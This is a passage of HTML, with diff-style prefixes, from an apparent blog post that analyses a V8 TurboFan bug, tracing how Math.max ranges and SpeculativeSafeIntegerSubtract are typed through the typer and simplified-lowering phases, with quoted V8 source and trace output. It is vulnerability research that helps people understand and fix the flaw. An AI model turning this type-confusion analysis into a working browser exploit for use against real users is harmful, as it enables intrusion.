+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>                             jsgraph()<span style="color:#f92672">-&gt;</span>ConstantNoHole(<span style="color:#f92672">-</span>V8_INFINITY));
+</span></span></code></pre></div><p><img src="/img/image8.png" alt="">
+Fig 6: Inlining phase</p>
+<h4 id="typer-phase"><em>Typer Phase:</em></h4>
+<p>In the <strong>Typer phase</strong>, each node is assigned a type, with a <strong>range</strong> added to define the possible values the node can hold. This range helps V8 speculate on the node’s type more accurately. For instance, a <code>NumberConstant</code> node for <code>-1</code> will have a range <code>(-1, -1)</code>, indicating its exact value is <code>-1</code> and probably speculated as an <code>int32</code>. The variable “<code>x”</code>in our function type is <code>Phi</code> Node(or union) of two values with ranges <code>(-1, -1)</code> of Node #14 and <code>(0, 0xFFFFFFFF)</code> of Node #20, so input to <code>NumberMax</code> will take the union of these ranges, resulting in <code>(-1, 0xFFFFFFFF)</code>.</p>
+<p>Notice that For the <code>NumberMax</code> node, the range <code>(0, 0xFFFFFFFF)</code> is assigned, as this is the only range that can result from the <code>Math.max</code> computation. Since <code>Math.max(0, -1)</code> and <code>Math.max(0, 0xFFFFFFFF)</code> will only produce values within this range, it accurately reflects the possible output of the <code>Math.max</code> operation. So far so good, let’s move on to the next phase.</p>
+<p><img src="/img/image7.png" alt="">
+Fig 7: Typer phase</p>
+<h4 id="typed-lowering"><em>Typed Lowering</em></h4>
+<p>In the <strong>Typed Lowering</strong> phase, <code>SpeculativeToNumber</code> nodes #55 #54 are removed since <code>NumberConstant</code> nodes are guaranteed to remain <code>NumberConstant</code>, which simplifies the graph as shown below. Beyond this, nothing particularly interesting or relevant to our focus occurs in this phase.</p>
+<p><img src="/img/image10.png" alt=""></p>
+<p>Fig 8: Typed lowering phase</p>
+<h4 id="simplified-lowering-phase">Simplified Lowering Phase</h4>
+<p>In the <strong>Simplified Lowering</strong> phase, V8’s TurboFan compiler optimizes high-level operations by selecting the best machine-level representations and instructions. For example, SpeculativeSafeIntegerSubtract is replaced below with machine-level representation instruction Int32Sub.</p>
+<p>This Simplified lowering has three main steps, Faraz has a pretty good blog on this phase for RCA of a bug <a href="https://faraz.faith/2021-01-07-cve-2020-16040-analysis/">here</a>. You can add &ndash;trace-representation command line argument to see TRACE of what’s happening in simplified lowering. Let’s see how the below final Graph after simplified lowering is created</p>
+<p><img src="/img/image4.png" alt=""><br>
+Fig 9: Simplified Lowering</p>
+<p><strong>Step 1: Propagate phase</strong></p>
+<p>In the <strong>PROPAGATE</strong> phase, TurboFan traverses the graph from outputs to inputs, moving from the bottom to the top and determining the ideal machine representation for each node and its inputs, based on how it&rsquo;s used. Let’s say the traversal is at Node #41 which is SpeculativeSafeIntegerSubtract the Node(relevant for our bug).</p>
+<p>It enters a switch case at [1] in the below code and calls VisitSpeculativeIntegerAdditiveOp with node, and default truncation value Truncation::None(), lowering is false for propagate phase. (I will explain what is truncation below)</p>
+<p><em>src/compiler/simplified-lowering.cc</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span> <span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span>Phase T<span style="color:#f92672">&gt;</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span> <span style="color:#66d9ef">void</span> VisitNode(Node<span style="color:#f92672">*</span> node, Truncation truncation,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>                SimplifiedLowering<span style="color:#f92672">*</span> lowering) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>   tick_counter_<span style="color:#f92672">-&gt;</span>TickAndMaybeEnterSafepoint();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>   <span style="color:#66d9ef">if</span> (lower<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>()) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>[...]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>[...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>     <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kSpeculativeSafeIntegerAdd:   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>     <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kSpeculativeSafeIntegerSubtract: <span style="color:#75715e">// [1]  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#75715e"></span>       <span style="color:#66d9ef">return</span> VisitSpeculativeIntegerAdditiveOp<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>(node, truncation, lowering);   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>       <span style="color:#75715e">// visit #41: SpeculativeSafeIntegerSubtract (trunc: no-truncation (but distinguish zeros))
+</span></span></span></code></pre></div><p>Then inside VisitSpeculativeIntegerAdditiveOp speculates that SpeculativeSafeIntegerSubtract produces kSignedSmall, technically our PoC doesn’t produce kSignedSmall but it speculates. And from this kSignedSmall speculation, UseInfo[4] object is created for both the operands of subtraction. The class is used to describe the use of an input of a node. UseInfo == How the Node is used.  During this phase, the usage information for a node determines the best possible lowering for each operator so far, and that in turn determines the output representation of each node.</p>
+<p>So here the left and right operands are used in SpeculativeSafeIntegerSubtract as [3] kWord32, kSignedSmall typecheck. Next calls are not relevant for our bug in the propagation phase. Also importantly the restriction of the current node at [0] is set to Type:Signed32() in our case, which means the node is restricted to igned32 range only.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span> <span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span>Phase T<span style="color:#f92672">&gt;</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span> <span style="color:#66d9ef">void</span> VisitSpeculativeIntegerAdditiveOp(Node<span style="color:#f92672">*</span> node, Truncation truncation,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>                                        SimplifiedLowering<span style="color:#f92672">*</span> lowering) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>   [...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>   <span style="color:#75715e">// Try to use type feedback.  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#75715e"></span>   Type <span style="color:#66d9ef">const</span> restriction <span style="color:#f92672">=</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>       truncation.IsUsedAsWord32()<span style="color:#f92672">?</span> Type<span style="color:#f92672">::</span>Any()  <span style="color:#f92672">:</span> (truncation.identify_zeros() <span style="color:#f92672">==</span> kIdentifyZeros)  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>                 <span style="color:#f92672">?</span> Type<span style="color:#f92672">::</span>Signed32OrMinusZero()  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>                 <span style="color:#f92672">:</span> Type<span style="color:#f92672">::</span>Signed32(); [<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>   NumberOperationHint <span style="color:#66d9ef">const</span> hint <span style="color:#f92672">=</span> NumberOperationHint<span style="color:#f92672">::</span>kSignedSmall; <span style="color:#75715e">// [1]  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#75715e"></span>   DCHECK_EQ(hint, NumberOperationHintOf(node<span style="color:#f92672">-&gt;</span>op()));  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>     [...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>     UseInfo left_use <span style="color:#f92672">=</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>         CheckedUseInfoAsWord32FromHint(hint, left_identify_zeros); <span style="color:#75715e">// [2]  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#75715e"></span>     <span style="color:#75715e">// For CheckedInt32Add and CheckedInt32Sub, we don&#39;t need to do  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span><span style="color:#75715e"></span>     <span style="color:#75715e">// a minus zero check for the right hand side, since we already  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#75715e"></span>     <span style="color:#75715e">// know that the left hand side is a proper Signed32 value,  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#75715e"></span>     <span style="color:#75715e">// potentially guarded by a check.  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#75715e"></span>     TRACE(<span style="color:#e6db74">&#34;[checked] We  are second here %s&#34;</span>,node<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>mnemonic());   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>     <span style="color:#75715e">//UseInfo(MachineRepresentation::kWord32,   Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,   feedback);  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span><span style="color:#75715e"></span>     UseInfo right_use <span style="color:#f92672">=</span> CheckedUseInfoAsWord32FromHint(hint, kIdentifyZeros); <span style="color:#75715e">// [3]  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#75715e"></span>     VisitBinop<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>(node, left_use, right_use, MachineRepresentation<span style="color:#f92672">::</span>kWord32,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>                   restriction);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>   }  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span><span style="color:#75715e">//src/compiler/use-info.h
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UseInfo</span> { [<span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span> UseInfo(MachineRepresentation representation, Truncation truncation,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>         TypeCheckKind type_check <span style="color:#f92672">=</span> TypeCheckKind<span style="color:#f92672">::</span>kNone,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>         <span style="color:#66d9ef">const</span> FeedbackSource<span style="color:#f92672">&amp;</span> feedback <span style="color:#f92672">=</span> FeedbackSource())
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>     <span style="color:#f92672">:</span> representation_(representation),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>       truncation_(truncation),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>       type_check_(type_check),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span>       feedback_(feedback) {} 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span> }
+</span></span></code></pre></div><p>Also as the name implies it propagates &ldquo;truncation&rdquo; information, stored in the <code>UseInfo</code> to the upper node while it&rsquo;s traversing. Here “truncation” specifies which part of the input to use at that node. For example, when the propagate phase visits a <code>Branch</code> (#16) node, it truncates its input(#15 below) to <code>bool</code> since <code>Branch</code> expects a boolean value. For bitwise operators like <code>or(#25)</code>, inputs are truncated to <code>word32 (#21, #21)</code>. Usually a new node is created between input and or binary operation with an instruction called TruncateInt64ToInt32 which simply discards the higher bits.</p>
+<p>Output from –trace-representation for statement (return x | a)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#f92672">--</span>{Propagate phase}<span style="color:#f92672">--</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>visit <span style="color:#75715e">#25: SpeculativeNumberBitwiseOr (trunc: no-truncation (but distinguish zeros)) // OR | Node</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  initial <span style="color:#75715e">#21: truncate-to-word32 // x</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  initial <span style="color:#75715e">#2: truncate-to-word32 // a</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  [<span style="color:#f92672">...</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span> visit <span style="color:#75715e">#16: Branch (trunc: no-value-use)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  	initial <span style="color:#75715e">#15: truncate-to-bool</span>
+</span></span></code></pre></div><p>For our poc, the propagate phase produces the following representation. Notice that SpeculativeSafeIntegerSubtract and NumberMax inputs don’t have any truncation reflecting our analysis above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#f92672">--</span>{Propagate phase}<span style="color:#f92672">--</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span> visit <span style="color:#75715e">#42: Return (trunc: no-value-use)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  initial <span style="color:#75715e">#22: truncate-to-word32</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  initial <span style="color:#75715e">#41: no-truncation (but distinguish zeros)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  initial <span style="color:#75715e">#41: no-truncation (but distinguish zeros)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  initial <span style="color:#75715e">#18: no-value-use</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span> visit <span style="color:#75715e">#41: SpeculativeSafeIntegerSubtract (trunc: no-truncation (but distinguish zeros))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>  initial <span style="color:#75715e">#22: no-truncation (but distinguish zeros)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>  initial <span style="color:#75715e">#56: no-truncation (but identify zeros)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>  initial <span style="color:#75715e">#52: no-value-use</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>  initial <span style="color:#75715e">#18: no-value-Use</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>  [<span style="color:#f92672">...</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span> visit <span style="color:#75715e">#56: NumberMax (trunc: no-truncation (but identify zeros))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>  initial <span style="color:#75715e">#22: no-truncation (but distinguish zeros)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>  initial <span style="color:#75715e">#21: no-truncation (but distinguish zeros)</span>
+</span></span></code></pre></div><p><strong>Step 2: Retype phase</strong></p>
+<p>Then, in <strong>RETYPE</strong>, for every node the type information is updated [1] based on type feedback collected from previous phases, allowing more refined type assumptions as TurboFan continues to lower nodes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">RetypeNode</span>(Node<span style="color:#f92672">*</span> node) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
